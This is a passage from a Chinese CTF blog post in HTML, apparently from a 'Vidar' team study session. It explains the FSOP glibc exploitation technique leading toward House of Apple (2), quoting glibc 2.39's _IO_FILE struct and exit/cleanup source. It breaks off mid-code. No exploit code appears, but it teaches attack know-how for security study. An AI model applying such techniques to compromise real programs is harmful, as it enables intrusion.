@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#54C8C4" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
+<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/180pixil-frame-0.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32pixil-frame-0.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16pixil-frame-0.png">
+  <link rel="mask-icon" href="/images/pixil-frame-0.png.svg" color="#54C8C4">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic%7CNoto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":"mac","style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeIn","post_block":"fadeIn","post_header":"fadeIn","post_body":"fadeIn"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="I. FSOP  FSOP 是 File Stream Oriented Programming 的缩写。 FSOP 的核心思想就是劫持 _IO_list_all 的值来伪造链表和其中的 _IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vidar 分享会 - FSOP">
+<meta property="og:url" content="http://example.com/2025/04/01/glibcFSOP/index.html">
+<meta property="og:site_name" content="蘅芷清芬">
+<meta property="og:description" content="I. FSOP  FSOP 是 File Stream Oriented Programming 的缩写。 FSOP 的核心思想就是劫持 _IO_list_all 的值来伪造链表和其中的 _IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/glibcFSOP/Screenshot_20250331_190446.png">
+<meta property="og:image" content="http://example.com/glibcFSOP/image-20250408191324901.png">
+<meta property="og:image" content="http://example.com/2025/04/01/glibcFSOP/glibcFSOP/image-20250408193602020.png">
+<meta property="article:published_time" content="2025-03-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-04-16T04:18:18.411Z">
+<meta property="article:author" content="summ2">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="FSOP">
+<meta property="article:tag" content="House of Apple">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/glibcFSOP/Screenshot_20250331_190446.png">
+
+
+<link rel="canonical" href="http://example.com/2025/04/01/glibcFSOP/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/04/01/glibcFSOP/","path":"2025/04/01/glibcFSOP/","title":"Vidar 分享会 - FSOP"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Vidar 分享会 - FSOP | 蘅芷清芬</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">蘅芷清芬</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa-solid fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-ctf"><a href="/categories/CTF" rel="section"><i class="fa-solid fa-flag fa-fw"></i>CTF</a></li><li class="menu-item menu-item-日常"><a href="/categories/%E6%97%A5%E5%B8%B8" rel="section"><i class="fa-solid fa-file fa-fw"></i>日常</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa-solid fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa-solid fa-link fa-fw"></i>友链</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#i.-fsop"><span class="nav-number">1.</span> <span class="nav-text">I. FSOP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ii.-rtfsc"><span class="nav-number">2.</span> <span class="nav-text">II. RTFSC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#io_file"><span class="nav-number">2.1.</span> <span class="nav-text">_IO_FILE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exit-%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">2.2.</span> <span class="nav-text">Exit () 调用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#run_exit_handlers"><span class="nav-number">2.2.1.</span> <span class="nav-text">__run_exit_handlers()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#io_cleanup"><span class="nav-number">2.2.2.</span> <span class="nav-text">_IO_cleanup()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#io_flush_all"><span class="nav-number">2.2.3.</span> <span class="nav-text">_IO_flush_all()</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#vtable2"><span class="nav-number">2.2.3.1.</span> <span class="nav-text">vtable2</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#iii.-house-of-apple"><span class="nav-number">3.</span> <span class="nav-text">III. House of Apple</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%84%E9%80%A0_io_file_plus"><span class="nav-number">3.1.</span> <span class="nav-text">构造_IO_FILE_plus</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wide_data%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-number">3.2.</span> <span class="nav-text">_wide_data 调用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%84%E9%80%A0_wide_data-_wide_vtable"><span class="nav-number">3.3.</span> <span class="nav-text">构造_wide_data,
+_wide_vtable</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#references"><span class="nav-number">4.</span> <span class="nav-text">References</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">summ2</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/avasummer" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;avasummer" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:summ2@hdu.edu.cn" title="E-Mail → mailto:summ2@hdu.edu.cn" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/01/glibcFSOP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="summ2">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="蘅芷清芬">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Vidar 分享会 - FSOP | 蘅芷清芬">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Vidar 分享会 - FSOP
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-04-01 00:00:00" itemprop="dateCreated datePublished" datetime="2025-04-01T00:00:00+08:00">2025-04-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="i.-fsop">I. FSOP</h1>
+<blockquote>
+<p>FSOP 是 File Stream Oriented Programming 的缩写。</p>
+<p>FSOP 的核心思想就是劫持
+<code>_IO_list_all</code> 的值来伪造链表和其中的
+<code>_IO_FILE</code> 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP
+选择的触发方法是调用<code>_IO_flush_all_lockp</code>，这个函数会刷新<code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个
+FILE 调用
+fflush，也对应着会调用<code>_IO_FILE_plus.vtable</code> 中的<code>_IO_overflow</code>。
+<span id="more"></span></p>
+</blockquote>
+<h1 id="ii.-rtfsc">II. RTFSC</h1>
+<p>下面我将以 glibc-2.39 源码为例，分析 FSOP 的一个实际应用 ---House of
+Apple (2)<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a> 涉及的原理。</p>
+<h2 id="io_file">_IO_FILE</h2>
+<p><code>/libio/bits/types/struct_FILE.h</code> 中有如下定义：</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don't get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
+<p>使用 gdb，可以得到其成员的相对偏移：</p>
+<figure>
+<img src="\glibcFSOP/Screenshot_20250331_190446.png" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<h2 id="exit-调用过程">Exit () 调用过程</h2>
+<h3 id="run_exit_handlers">__run_exit_handlers()</h3>
+<p><code>exit()</code> 在 <code>/stdlib/exit.c</code> 有定义:</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pointer_guard.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;libc-lock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set-freeres.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"exit.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Initialize the flag that indicates exit function processing</span></span><br><span class="line"><span class="comment">   is complete. See concurrency notes in stdlib/exit.h where</span></span><br><span class="line"><span class="comment">   __exit_funcs_lock is declared.  */</span></span><br><span class="line"><span class="type">bool</span> __exit_funcs_done = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Call all functions registered with `atexit' and `on_exit',</span></span><br><span class="line"><span class="comment">   in the reverse of the order in which they were registered</span></span><br><span class="line"><span class="comment">   perform stdio cleanup, and terminate program execution with STATUS.  */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp,</span><br><span class="line">		     <span class="type">bool</span> run_list_atexit, <span class="type">bool</span> run_dtors)</span><br><span class="line">{</span><br><span class="line">  <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line">  <span class="keyword">if</span> (run_dtors)</span><br><span class="line">    call_function_static_weak (__call_tls_dtors);</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">     the functions registered with `atexit' and `on_exit'. We call</span></span><br><span class="line"><span class="comment">     everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">     exit (). */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    {</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span>;</span></span><br><span class="line"></span><br><span class="line">    restart:</span><br><span class="line">      cur = *listp;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (cur == <span class="literal">NULL</span>)</span><br><span class="line">	{</span><br><span class="line">	  <span class="comment">/* Exit processing complete.  We will not allow any more</span></span><br><span class="line"><span class="comment">	     atexit/on_exit registrations.  */</span></span><br><span class="line">	  __exit_funcs_done = <span class="literal">true</span>;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">	{</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">	  <span class="type">const</span> <span class="type">uint64_t</span> new_exitfn_called = __new_exitfn_called;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">	    {</span><br><span class="line">	      <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">	      <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">	      <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">	      <span class="type">void</span> *arg;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">case</span> ef_free:</span><br><span class="line">	    <span class="keyword">case</span> ef_us:</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_on:</span><br><span class="line">	      onfct = f-&gt;func.on.fn;</span><br><span class="line">	      arg = f-&gt;func.on.arg;</span><br><span class="line">	      PTR_DEMANGLE (onfct);</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">	      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">	      onfct (status, arg);</span><br><span class="line">	      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_at:</span><br><span class="line">	      atfct = f-&gt;func.at;</span><br><span class="line">	      PTR_DEMANGLE (atfct);</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">	      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">	      atfct ();</span><br><span class="line">	      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">case</span> ef_cxa:</span><br><span class="line">	      <span class="comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span></span><br><span class="line"><span class="comment">		 we must mark this function as ef_free.  */</span></span><br><span class="line">	      f-&gt;flavor = ef_free;</span><br><span class="line">	      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line">	      arg = f-&gt;func.cxa.arg;</span><br><span class="line">	      PTR_DEMANGLE (cxafct);</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">	      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">	      cxafct (arg, status);</span><br><span class="line">	      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    }</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))</span><br><span class="line">	    <span class="comment">/* The last exit function, or another thread, has registered</span></span><br><span class="line"><span class="comment">	       more exit functions.  Start the loop over.  */</span></span><br><span class="line">	    <span class="keyword">goto</span> restart;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">      *listp = cur-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">	<span class="comment">/* Don't free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">	   allocate element.  */</span></span><br><span class="line">	<span class="built_in">free</span> (cur);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    call_function_static_weak (_IO_cleanup);</span><br><span class="line"></span><br><span class="line">  _exit (status);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">{</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">}</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="io_cleanup">_IO_cleanup()</h3>
+<p>在<code>__run_exit_handlers</code> 中调用了<code>_IO_cleanup</code>，它在 <code>/libio/genops.c</code> 中有定义:</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We currently don't have a reliable mechanism for making sure that</span></span><br><span class="line"><span class="comment">     C++ static destructors are executed in the correct order.</span></span><br><span class="line"><span class="comment">     So it is possible that other static destructors might want to</span></span><br><span class="line"><span class="comment">     write to cout - and they're supposed to be able to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The following will make the standard streambufs be unbuffered,</span></span><br><span class="line"><span class="comment">     which forces any output from late destructors to be written out. */</span></span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line"></span><br><span class="line">  <span 